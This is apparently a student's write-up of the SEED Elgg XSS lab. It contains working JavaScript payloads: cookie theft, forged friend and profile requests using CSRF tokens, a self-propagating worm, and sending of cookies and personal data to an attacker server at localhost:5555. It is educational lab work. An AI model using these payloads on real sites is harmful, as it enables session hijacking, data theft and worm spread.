@@ -1,0 +1,328 @@
+* Setup
+** Docker Compose Setup
+*** cd category-web/Web_XSS_Elgg/Labsetup
+*** docker-compose up
+*** modify the /etc/hosts file with the following configurations
+      10.9.0.5 www.seed-server.com
+      10.9.0.5 www.example32a.com
+      10.9.0.5 www.example32b.com
+      10.9.0.5 www.example32c.com
+      10.9.0.5 www.example60.com
+      10.9.0.5 www.example70.com
+*** Go to www.seed-server.com and if you find the login page then the setup is complete
+
+** Credentials
+|----------+-------------|
+| UserName | Password    |
+|----------+-------------|
+| admin    | seedelgg    |
+|----------+-------------|
+| alice    | seedalice   |
+|----------+-------------|
+| boby     | seedboby    |
+|----------+-------------|
+| charlie  | seedcharlie |
+|----------+-------------|
+| samy     | seedsamy    |
+|----------+-------------|
+
+
+* Task 1
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+    <script>alert("XSS");</script>
+#+END_SRC
+** Screenshot
+    [[./screenshots/task-1-inject-js.png]]
+
+
+* Task 2
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+    <script>alert(document.cookie);</script>
+#+END_SRC
+** Screenshot
+    [[./screenshots/task-2-display-cookie.png]]
+
+
+    
+* Task 3
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script type="text/javascript">
+    window.onload = function () {
+      var Ajax=null;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // 1
+      var token="&__elgg_token="+elgg.security.token.__elgg_token; // 2
+      //Construct the HTTP request to add Samy as a friend.
+      var sendurl='http://www.seed-server.com/action/friends/add?friend=59'+ts+token; 
+      //Create and send Ajax request to add friend
+      Ajax=new XMLHttpRequest();
+      Ajax.open("GET", sendurl, true);
+      Ajax.send();
+    }
+  </script>
+#+END_SRC
+
+Here when Alice visits Samy's profile a Samy will be automatically befriended with his profile visitor(victim).
+The script attached in the about me section will be executed and that will silently send a request from victim's end.
+
+We need ts and token because this provide authentication,i.e. the attackers request is posing as if as it is coming
+from the victim's end.
+
+** Screenshot
+[[./screenshots/task-4-victim-befriended.png]]
+
+
+
+
+* Task 4
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script type="text/javascript">
+    window.onload = function(){
+      //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+      //and Security Token __elgg_token
+      var username="&name="+elgg.session.user.name;
+      var guid="&guid="+elgg.session.user.guid;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+      var token="&__elgg_token="+elgg.security.token.__elgg_token;
+      var description='&description=<p>Samy is my hero<p>';
+      //Construct the content of your url.
+      var samyGuid=59;
+      var sendurl='http://www.seed-server.com/action/profile/edit';
+      var content=username+guid+ts+token+description;
+      if(elgg.session.user.guid!=samyGuid) { // 1
+        //Create and send Ajax request to modify profile
+        var Ajax=null;
+        Ajax=new XMLHttpRequest();
+        Ajax.open("POST", sendurl, true);
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        Ajax.send(content);
+      }
+    }
+  </script>
+#+END_SRC
+
+Here the line with if condition is very important because, if we change the about me section of even Samy, the attack would only work until Samy visits
+his profile next time, after that Samy's 'About Me' section will be changed to '<p>Samy is my hero<p>' and the attack will no longer work since
+there is no malacious code in Samy's profile anymore.
+
+So with the line 1 we are guarding our injection so that, samy profile doesn't change with AJAX requests.
+
+** Screenshot
+[[./screenshots/task-5-samy-is-my-hero.png]]
+
+
+* Task 5
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script type="text/javascript">
+    window.onload = function () {
+      var username="&name="+elgg.session.user.name;
+      var guid="&guid="+elgg.session.user.guid;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts; // 1
+      var token="&__elgg_token="+elgg.security.token.__elgg_token; // 2
+      var description='&description=<p>Samy is my hero<p>';
+
+      //Construct the HTTP requests
+      var sendurlFriend='http://www.seed-server.com/action/friends/add?friend=59'+ts+token; 
+      var sendurlProfile='http://www.seed-server.com/action/profile/edit';
+
+      //Create and send Ajax requests
+      var samyGuid=59;
+      if(elgg.session.user.guid!=samyGuid) { // 1
+        //Create and send Ajax request to modify profile
+        var Ajax=new XMLHttpRequest();
+        Ajax.open("POST", sendurlProfile, true);
+        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        var content=username+guid+ts+token+description;
+        Ajax.send(content);
+
+        Ajax=new XMLHttpRequest();
+        Ajax.open("GET", sendurlFriend, true);
+        Ajax.send();
+      }
+    }
+  </script>
+#+END_SRC
+
+Here when Alice visits Samy's profile a Samy will be automatically befriended with his profile visitor(victim).
+And her about me in the profile will be changed.
+
+** Screenshot
+    [[./screenshots/task-3-4.png]]
+
+
+* Task 6
+
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script id="worm">
+    window.onload = function(){
+      //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
+      //and Security Token __elgg_token
+      var username="&name="+elgg.session.user.name;
+      var guid="&guid="+elgg.session.user.guid;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+      var token="&__elgg_token="+elgg.security.token.__elgg_token;
+      //Construct the content of your url.
+      var sendurl='http://www.seed-server.com/action/profile/edit';
+
+      var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+      var jsCode = document.getElementById("worm").innerHTML;
+      var tailTag = "</" + "script>";
+      var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+
+      var description='&description=<p>Samy is my hero<p>' + wormCode;
+      var content=username+guid+ts+token+description;
+
+      var Ajax=new XMLHttpRequest();
+      Ajax.open("POST", sendurl, true);
+      Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      Ajax.send(content);
+    }
+  </script>
+#+END_SRC
+
+  Here when someone visits samy's profile the code gets replicated into his description, and then when someone else visits infected persons profile
+  then his profile also gets infected and the worm spread in the internet.
+
+
+* Task 7
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script type="text/javascript">
+    window.onload = function() {
+      var username=elgg.session.user.username;
+      var settingsurl = `http://www.seed-server.com/settings/user/${username}`;
+      var Ajax=new XMLHttpRequest();
+      Ajax.onreadystatechange = () => {
+        if (Ajax.readyState === 4) {
+          (function(response) {
+              var isBoby = /elgg_boby@seed-labs.com/.test(response);
+              if (!isBoby) return;
+              var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+              var token="&__elgg_token="+elgg.security.token.__elgg_token;
+              var name="&name=Bola";
+              var sendurl='http://www.seed-server.com/action/usersettings/save';
+              var content=ts+token+name;
+              var AjaxI=new XMLHttpRequest();
+              AjaxI.open("POST", sendurl, true);
+              AjaxI.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+              AjaxI.send(content);
+          })(Ajax.response);
+        }
+      }
+      Ajax.open("GET", settingsurl, true);
+      Ajax.send();
+    }
+  </script>
+#+END_SRC
+
+  Here first we are checking whether the visitor is Boby by getting his email through settings page using Ajax. As we know Boby's email,
+  so we are checking whether its truely boby or not using the email address. The test is very crude in terms that it the search will return true
+  if it finds boby's email in settings page among many other things using regex. After we are confirmed that it is Boby, who is visiting Samy's
+  profile page, then we create a post request with display name 'Bola' and execute it.
+
+** Screenshots
+    [[./screenshots/task-7.png]]
+
+
+
+* Task 8 
+   Since we are simulating the cookie stealing using a server, we are assuming localhost is the host machine setup by the attacker. 
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+    <script>document.write('<img src=http://localhost:5555?c='+escape(document.cookie)+'>');</script>
+#+END_SRC
+** Screenshot
+    [[./screenshots/task-3-steal-cookie.png]]
+
+
+* Task 9
+    Since we are simulating the cookie stealing using a server, we are assuming localhost is the host machine setup by the attacker. 
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script type="text/javascript">
+    window.onload = function() {
+      var username="&name="+elgg.session.user.name;
+      var guid="&guid="+elgg.session.user.guid;
+      var url="http://localhost:5555?"+username+guid;
+
+      var Ajax=new XMLHttpRequest();
+      Ajax.open("GET", url, true);
+      Ajax.send();
+    }
+  </script>
+#+END_SRC
+
+** Screenshot
+[[./screenshots/task-9.png]]
+
+
+
+* Task 10
+** Insert malacious JS script tag in the about me section of profile
+#+BEGIN_SRC js
+  <script id="worm" type="text/javascript">
+    window.onload = function() {
+      var username=elgg.session.user.username;
+      var settingsurl = `http://www.seed-server.com/profile/${username}`;
+      var Ajax=new XMLHttpRequest();
+      Ajax.onreadystatechange = () => {
+        if (Ajax.readyState === 4) {
+          (function(response) {
+              var hiddenDiv = document.createElement('div');
+              hiddenDiv.setAttribute("id", "hiddenDiv");
+              hiddenDiv.setAttribute("style", "display: none;");
+              hiddenDiv.innerHTML=response;
+              try{
+                var phone="@phone=" + encodeURIComponent(hiddenDiv.querySelector('[data-name="mobile"]').innerText);
+                var twitter="@twitter=" + encodeURIComponent(hiddenDiv.querySelector('[data-name="twitter"]').innerText);
+                var sendurl='http://localhost:5555?'+phone+twitter;
+                var AjaxI=new XMLHttpRequest();
+                AjaxI.open("GET", sendurl, true);
+                AjaxI.send();
+              }catch(e) {
+                  console.log(e);
+              }
+          })(Ajax.response);
+        }
+      }
+      Ajax.open("GET", settingsurl, false);
+      Ajax.send();
+
+      var name="&name="+elgg.session.user.name;
+      var guid="&guid="+elgg.session.user.guid;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+      var token="&__elgg_token="+elgg.security.token.__elgg_token;
+      var sendurl='http://www.seed-server.com/action/profile/edit';
+      var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
+      var jsCode = document.getElementById("worm").innerHTML;
+      var tailTag = "</" + "script>";
+      var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
+      var description='&description='+wormCode;
+      var content=name+guid+ts+token+description;
+
+      var Ajax=new XMLHttpRequest();
+      Ajax.open("POST", sendurl, true);
+      Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+      Ajax.send(content);
+    }
+  </script>
+#+END_SRC
+
+
+** Screenshots
+  First Alice visits Samy's profile and gets herself infected and her mobile no and twitter username is sent to samy's machine.
+  [[./screenshots/task-10-stolen-alice.png]]
+  [[./screenshots/task-10-stolen-alice-requests.png]]
+  [[./screenshots/task-10-injected-worm-alice.png]]
+
+  Then Charlie visits Alice's profile and gets himself infected and his mobile no and twitter username is sent to samy's machine.
+  He also gets infected with the worm.
+  [[./screenshots/task-10-stolen-charlie.png]]
+  [[./screenshots/task-10-stolen-charlie-requests.png]]
+  [[./screenshots/task-10-injected-worm-charlie.png]]
+
